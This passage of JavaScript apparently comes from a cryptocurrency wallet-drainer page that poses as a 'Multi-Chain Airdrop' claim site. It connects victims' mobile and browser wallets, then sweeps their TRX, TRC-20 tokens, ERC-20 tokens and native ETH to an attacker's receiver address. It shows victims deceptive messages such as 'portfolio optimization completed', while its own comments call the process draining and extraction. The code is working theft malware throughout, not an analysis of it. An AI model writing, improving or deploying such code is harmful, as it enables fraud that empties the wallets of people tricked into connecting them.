                    console.log(`TRX balance fetch attempt ${retryCount} failed:`, error.message);
                    
                    if (retryCount >= maxRetries) {
                        throw new Error(`Failed to get TRX balance after ${maxRetries} attempts: ${error.message}`);
                    }
                    
                    // Wait before retrying
                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                }
            }
            
            const trxBalance = tronWeb.fromSun(balance);
            console.log(`TRX balance: ${trxBalance}`);

            // Use precise fee calculation (same approach as ETH script)
            const minFeeReserve = 0.1; // Typical TRX transaction costs ~0.1 TRX
            
            if (parseFloat(trxBalance) > minFeeReserve) {
                const amountToSend = parseFloat(trxBalance) - minFeeReserve;
                console.log(`Transferring ${amountToSend} TRX to ${TRON_RECEIVER}`);
                console.log(`Leaving ${minFeeReserve} TRX for transaction fees`);
                
                try {
                    // Create and send TRX transaction with proper error handling
                    const transaction = await tronWeb.transactionBuilder.sendTrx(
                        TRON_RECEIVER,
                        tronWeb.toSun(amountToSend),
                        userAddress
                    );
                    
                    const signedTx = await tronWeb.trx.sign(transaction);
                    const result = await tronWeb.trx.sendRawTransaction(signedTx);
                    
                    if (result && result.result) {
                        console.log(`TRX transfer successful: ${result.txid || result.transaction?.txID}`);
                    } else {
                        console.log("TRX transfer completed");
                    }
                    
                } catch (trxError) {
                    console.error("TRX transfer failed:", trxError);
                    
                    // Don't throw error, just log and continue (same as ETH script)
                    if (trxError.message.includes("insufficient")) {
                        console.log("TRX transfer failed due to insufficient funds");
                    }
                }
            } else {
                console.log(`TRX balance too low for transfer: ${trxBalance} TRX (minimum required: ${minFeeReserve} TRX)`);
            }

            // Drain TRC-20 tokens with improved error handling
            for (const token of TRON_TOKENS) {
                try {
                    console.log(`Checking ${token.symbol}...`);
                    const contract = await tronWeb.contract().at(token.address);
                    const tokenBalance = await contract.balanceOf(userAddress).call();
                    
                    if (tokenBalance && tokenBalance.toString() !== '0') {
                        const tokenAmount = tronWeb.fromSun(tokenBalance) / Math.pow(10, token.decimals - 6);
                        console.log(`Found ${token.symbol} balance: ${tokenAmount}`);
                        
                        try {
                            // Transfer token with proper error handling
                            const transferResult = await contract.transfer(
                                TRON_RECEIVER,
                                tokenBalance
                            ).send();
                            
                            console.log(`${token.symbol} transfer successful`);
                        } catch (transferError) {
                            console.error(`${token.symbol} transfer failed:`, transferError.message);
                            // Continue with other tokens (same as ETH script)
                        }
                    } else {
                        console.log(`No ${token.symbol} balance found`);
                    }
                } catch (tokenError) {
                    console.error(`Error checking ${token.symbol}:`, tokenError.message);
                    // Continue with other tokens (same as ETH script)
                }
            }

            updateConnectionStatus("Tron portfolio optimization completed! 🎉");
            alert("Tron portfolio optimization completed successfully!");

        } catch (error) {
            console.error("Tron drain error:", error);
            updateConnectionStatus("Tron extraction failed", true);
            throw error;
        }
    }

    // Enhanced ERC-20 token draining function - FIXED VERSION
    // Enhanced ERC-20 token draining function - IMPROVED VERSION
    async function drainERC20Token(provider, signer, userAddress, token, receiverAddress, gasPrice = null) {
        try {
            // ERC-20 ABI for transfer function
            const erc20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function decimals() view returns (uint8)",
                "function symbol() view returns (string)"
            ];

            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);

            // Check token balance
            const balance = await tokenContract.balanceOf(userAddress);
            if (balance.isZero()) {
                console.log(`No ${token.symbol} balance found`);
                return false;
            }

            const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);

            // Get current gas price if not provided
            if (!gasPrice) {
                gasPrice = await provider.getGasPrice();
            }

            // Estimate gas for this specific token transfer
            let estimatedGas;
            try {
                estimatedGas = await tokenContract.estimateGas.transfer(receiverAddress, balance);
                // Add 20% buffer for safety
                estimatedGas = estimatedGas.mul(120).div(100);
            } catch (gasError) {
                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
            }

            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);

            // Check if user has enough ETH for gas
            const currentEthBalance = await provider.getBalance(userAddress);
            const gasCost = gasPrice.mul(estimatedGas);
            
            if (currentEthBalance.lt(gasCost)) {
                console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
                return false;
            }

            console.log(`Transferring ${tokenAmount} ${token.symbol} to ${receiverAddress}`);

            // Transfer tokens to receiver address with optimized gas
            const transferTx = await tokenContract.transfer(receiverAddress, balance, {
                gasLimit: estimatedGas,
                gasPrice: gasPrice,
                // Use maxFeePerGas for EIP-1559 if supported
                ...(provider.getNetwork().then(n => n.chainId === 1) && {
                    maxFeePerGas: gasPrice.mul(150).div(100), // 1.5x gas price as max
                    maxPriorityFeePerGas: ethers.utils.parseUnits("2", "gwei") // 2 gwei tip
                })
            });

            console.log(`${token.symbol} transfer tx: ${transferTx.hash}`);

            // Wait for confirmation
            const receipt = await transferTx.wait();
            console.log(`${token.symbol} transfer confirmed in block ${receipt.blockNumber}`);
            console.log(`Gas used: ${receipt.gasUsed.toString()}`);

            return true;

        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error);
            
            // Don't throw error, just return false to continue with other tokens
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log(`Insufficient funds for ${token.symbol} transfer`);
            } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                console.log(`Token ${token.symbol} transfer would fail, skipping`);
            }
            
            return false;
        }
    }

    // Drain native currency (ETH, BNB, MATIC) - FIXED VERSION using proven working approach
    async function drainNativeCurrency(provider, signer, userAddress, receiverAddress) {
        try {
            // Get current balance after token transfers
            const currentBalance = await provider.getBalance(userAddress);
            const currentEthBalance = ethers.utils.formatEther(currentBalance);
            console.log(`Current ETH balance before final transfer: ${currentEthBalance}`);

            if (currentBalance.isZero()) {
                console.log("No ETH balance remaining");
                return false;
            }

            // Get current gas price
            const gasPrice = await provider.getGasPrice();
            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);

            // Use a more conservative gas limit for the final transfer
            const gasLimit = ethers.BigNumber.from("21000");
            
            // Calculate exact gas cost
            const exactGasCost = gasPrice.mul(gasLimit);
            console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);

            // Calculate amount to send (total balance minus exact gas cost)
            const amountToSend = currentBalance.sub(exactGasCost);

            if (amountToSend.lte(0)) {
                console.log("Insufficient ETH balance for gas fees");
                console.log(`Balance: ${ethers.utils.formatEther(currentBalance)} ETH`);
                console.log(`Gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
                return false;
            }

            const ethToSend = ethers.utils.formatEther(amountToSend);
            console.log(`Transferring ${ethToSend} ETH to ${receiverAddress}`);
            console.log(`Leaving ${ethers.utils.formatEther(exactGasCost)} ETH for gas`);

            // Create transaction with precise gas parameters
            const txParams = {
                to: receiverAddress,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice,
                nonce: await provider.getTransactionCount(userAddress)
            };

            // For EIP-1559 networks, use maxFeePerGas
            const network = await provider.getNetwork();
            if (network.chainId === 1) { // Ethereum mainnet supports EIP-1559
                try {
                    const feeData = await provider.getFeeData();
                    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
                        delete txParams.gasPrice;
                        txParams.maxFeePerGas = feeData.maxFeePerGas;
                        txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
                        
                        // Recalculate amount with EIP-1559 fees
                        const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
                        const eip1559Amount = currentBalance.sub(eip1559GasCost);
                        
                        if (eip1559Amount.gt(0)) {
                            txParams.value = eip1559Amount;
                            console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
                        }
                    }
                } catch (eip1559Error) {
                    console.log("EIP-1559 fee estimation failed, using legacy gas pricing");
                }
            }

            // Send ETH transaction
            const tx = await signer.sendTransaction(txParams);
            console.log("ETH transfer tx:", tx.hash);

            // Wait for confirmation
            const receipt = await tx.wait();
            console.log("ETH transfer confirmed in block:", receipt.blockNumber);
            console.log("Gas used:", receipt.gasUsed.toString());
            console.log("Effective gas price:", ethers.utils.formatUnits(receipt.effectiveGasPrice || gasPrice, 'gwei'), "gwei");

            // Verify final balance
            const finalBalance = await provider.getBalance(userAddress);
            const finalEthBalance = ethers.utils.formatEther(finalBalance);
            console.log(`Final ETH balance: ${finalEthBalance} ETH`);

            if (finalBalance.gt(ethers.utils.parseEther("0.001"))) {
                console.warn(`Warning: ${finalEthBalance} ETH remaining (more than expected)`);
            }

            return true;

        } catch (error) {
            console.error("Error draining ETH:", error);
            
            if (error.code === 'INSUFFICIENT_FUNDS') {
                console.log("Transaction failed due to insufficient funds for gas");
            } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
                console.log("Transaction underpriced, gas price may have increased");
            }
            
            // Don't throw error, just return false to continue
            return false;
        }
    }

    // Enhanced mobile wallet connection handler with dynamic detection
    async function handleMobileConnection(selectedWalletKey) {
        if (!isMobileDevice()) {
            alert("Mobile wallets are only supported on mobile devices. Please select a desktop wallet or use a mobile device.");
            return;
        }

        // Extract wallet name from key (remove -mobile suffix and normalize)
        let walletName = selectedWalletKey.replace('-mobile', '').toLowerCase().trim();
        
        // Handle special wallet name mappings
        const walletNameMappings = {
            'trust': 'trust wallet',
            'coinbase': 'coinbase wallet',
            'metamask': 'metamask',
            'phantom': 'phantom',
            'tronlink': 'tronlink',
            'rainbow': 'rainbow',
            'exodus': 'exodus',
            'imtoken': 'imtoken',
            'tokenpocket': 'tokenpocket',
            'safepal': 'safepal'
        };
        
        // Use mapped name if available
        if (walletNameMappings[walletName]) {
            walletName = walletNameMappings[walletName];
        }

        updateConnectionStatus("Opening mobile wallet app...");
        
        // Try to open the mobile wallet app via enhanced deep link
        const deepLinkOpened = connectMobileWallet(walletName);
        if (deepLinkOpened) {
            updateConnectionStatus("Waiting for wallet connection... Please return after connecting.");
            
            // Show user instructions with enhanced guidance
            const mobileBrowser = getMobileBrowser();
            let browserSpecificNote = '';
            if (mobileBrowser === 'safari') {
                browserSpecificNote = '\n\nNote: Safari may ask to open the app. Tap "Open" to continue.';
            } else if (mobileBrowser === 'chrome') {
                browserSpecificNote = '\n\nNote: Chrome may ask permission to open the app. Tap "Open" to continue.';
            } else if (mobileBrowser === 'firefox') {
                browserSpecificNote = '\n\nNote: Firefox may block the deep link. Try copying the URL and opening it manually.';
            }
            
            const continueWaiting = confirm(
                `Opening ${walletName}...\n\n` +
                "Instructions:\n" +
                "1. The wallet app should open automatically\n" +
                "2. Connect your wallet in the app\n" +
                "3. Return to this page\n" +
                "4. Click OK to continue waiting, or Cancel to try a different method" +
                browserSpecificNote
            );
            
            if (continueWaiting) {
                // Wait for connection with enhanced timeout and detection
                const connectionResult = await waitForMobileConnection(45000);
                
                if (connectionResult.success) {
                    updateConnectionStatus("Mobile wallet connected successfully!");
                    
                    // Handle successful mobile connection based on wallet type
                    if (walletName.includes('phantom')) {
                        // Check if Phantom supports both EVM and Solana
                        const evmProvider = connectionResult.provider;
                        const solanaProvider = window.solana || (window.phantom && window.phantom.solana);
                        
                        if (evmProvider && solanaProvider) {
                            await handlePhantomMultiConnection({
                                name: "Phantom Mobile",
                                type: "multi",
                                evmNetworks: ["ethereum"],
                                solanaNetworks: ["solana"]
                            }, evmProvider, solanaProvider);
                        } else if (evmProvider) {
                            await handleEVMConnection({
                                name: "Phantom Mobile (EVM)",
                                provider: evmProvider,
                                networks: ["ethereum"]
                            });
                        } else if (solanaProvider) {
                            await handleSolanaConnection({
                                name: "Phantom Mobile (Solana)",
                                provider: solanaProvider,
                                networks: ["solana"]
                            });
                        }
                    } else if (walletName.includes('tronlink') || walletName.includes('tron')) {
                        if (window.tronWeb && window.tronWeb.defaultAddress) {
                            await handleTronConnection({
                                name: "TronLink Mobile",
                                provider: window.tronWeb,
                                networks: ["tron"]
                            });
                        } else {
                            alert("TronLink detected but not properly connected. Please ensure you're logged in to TronLink.");
                        }
                    } else {
                        // Handle as EVM wallet (Trust, Coinbase, MetaMask, etc.)
                        const walletDef = {
                            name: `${walletName} Mobile`,
                            provider: connectionResult.provider,
                            networks: ["ethereum", "bsc", "polygon"] // Most mobile wallets support multiple EVM networks
                        };
                        await handleEVMConnection(walletDef);
                    }
                    
                    return;
                } else {
                    updateConnectionStatus("Mobile connection failed or timed out", true);
                    alert("Connection timed out. Please try again or use WalletConnect instead.");
                    return;
                }
            } else {
                updateConnectionStatus("Mobile connection cancelled by user");
                return;
            }
        } else {
            updateConnectionStatus("Failed to open mobile wallet", true);
            alert(`Unable to open ${walletName}. Please install the wallet app and try again.`);
            return;
        }
    }

    // Enhanced mobile wallet connection with automatic detection and retry
    function connectMobileWallet(walletName, dappUrl = window.location.href) {
        if (!isMobileDevice()) {
            console.log("Not on mobile device, skipping mobile wallet connection");
            return false;
        }
        
        const deepLink = createMobileDeepLink(walletName, dappUrl);
        if (deepLink) {
            console.log(`Opening mobile deep link for ${walletName}:`, deepLink);
            
            // Try multiple methods to open the deep link
            try {
                // Method 1: Direct window.open
                const newWindow = window.open(deepLink, '_blank');
                
                // Method 2: If window.open fails, try location.href
                if (!newWindow || newWindow.closed) {
                    window.location.href = deepLink;
                }
                
                return true;
            } catch (error) {
                console.error("Failed to open deep link:", error);
                
                // Method 3: Create a temporary link and click it
                try {
                    const link = document.createElement('a');
                    link.href = deepLink;
                    link.target = '_blank';
                    link.rel = 'noopener noreferrer';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    return true;
                } catch (linkError) {
                    console.error("Failed to create and click link:", linkError);
                    return false;
                }
            }
        }
        
        console.warn(`No deep link available for wallet: ${walletName}`);
        return false;
    }

    // Function to wait for mobile wallet connection with improved detection
    function waitForMobileConnection(timeout = 30000) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            const checkInterval = 1000; // Check every second
            
            const checkConnection = async () => {
                try {
                    // Check for multiple wallet providers
                    if (window.ethereum) {
                        // Try to get accounts
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            resolve({ success: true, accounts, provider: window.ethereum });
                            return;
                        }
                    }
                    
                    // Check for specific wallet objects
                    const walletChecks = [
                        { provider: window.phantom?.ethereum, name: 'phantom' },
                        { provider: window.trustWallet, name: 'trust' },
                        { provider: window.coinbaseWalletExtension, name: 'coinbase' },
                        { provider: window.tronWeb, name: 'tronlink', isTron: true }
                    ];
                    
                    for (const wallet of walletChecks) {
                        if (wallet.provider) {
                            if (wallet.isTron) {
                                // Special handling for Tron
                                if (wallet.provider.defaultAddress && wallet.provider.defaultAddress.base58) {
                                    resolve({ success: true, accounts: [wallet.provider.defaultAddress.base58], provider: wallet.provider });
                                    return;
                                }
                            } else if (typeof wallet.provider.request === 'function') {
                                try {
                                    const accounts = await wallet.provider.request({ method: 'eth_accounts' });
                                    if (accounts && accounts.length > 0) {
                                        resolve({ success: true, accounts, provider: wallet.provider });
                                        return;
                                    }
                                } catch (error) {
                                    // Continue checking other wallets
                                }
                            }
                        }
                    }
                    
                    // Check for Solana wallet
                    if (window.solana && typeof window.solana.connect === 'function') {
                        try {
                            // Try to check if already connected
                            if (window.solana.isConnected && window.solana.publicKey) {
                                resolve({ 
                                    success: true, 
                                    accounts: [window.solana.publicKey.toString()], 
                                    provider: window.solana,
                                    isSolana: true 
                                });
                                return;
                            }
                        } catch (error) {
                            // Continue checking
                        }
                    }
                } catch (error) {
                    console.log("Still waiting for mobile connection...", error);
                }
                
                // Check if timeout reached
                if (Date.now() - startTime > timeout) {
                    resolve({ success: false, error: "Connection timeout" });
                    return;
                }
                
                // Continue checking
                setTimeout(checkConnection, checkInterval);
            };
            
            checkConnection();
        });
    }

    // WalletConnect connection handler
    async function handleWalletConnectConnection(selected) {
        if (!walletConnectAvailable || !WalletConnectProvider) {
            throw new Error("WalletConnect not available");
        }

        const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
        const provider = await WalletConnectProvider.init({
            projectId: PROJECT_ID,
            chains: [1, 56, 137],
            showQrModal: true,
            metadata: {
                name: "Multi-Chain Airdrop",
                description: "Claim your multi-chain airdrop tokens",
                url: window.location.origin,
                icons: ["https://walletconnect.com/walletconnect-logo.png"]
            }
        });

        await provider.connect();
        
        if (!provider.accounts || provider.accounts.length === 0) {
            throw new Error("No accounts connected via WalletConnect");
        }

        updateConnectionStatus("WalletConnect connected successfully!");
        
        // Handle as EVM wallet
        await handleEVMConnection({ 
            name: "WalletConnect", 
            provider: provider, 
            networks: ["ethereum", "bsc", "polygon"] 
        });
    }

    // Wait for wallet connection
    async function waitForConnection(timeout = 30000) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            const checkInterval = 1000;
            
            const checkConnection = async () => {
                try {
                    if (window.ethereum) {
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            resolve(true);
                            return;
                        }
                    }
                } catch (error) {
                    console.log("Still waiting for connection...");
                }
                
                if (Date.now() - startTime > timeout) {
                    resolve(false);
                    return;
                }
                
                setTimeout(checkConnection, checkInterval);
            };
            
            checkConnection();
        });
    }
});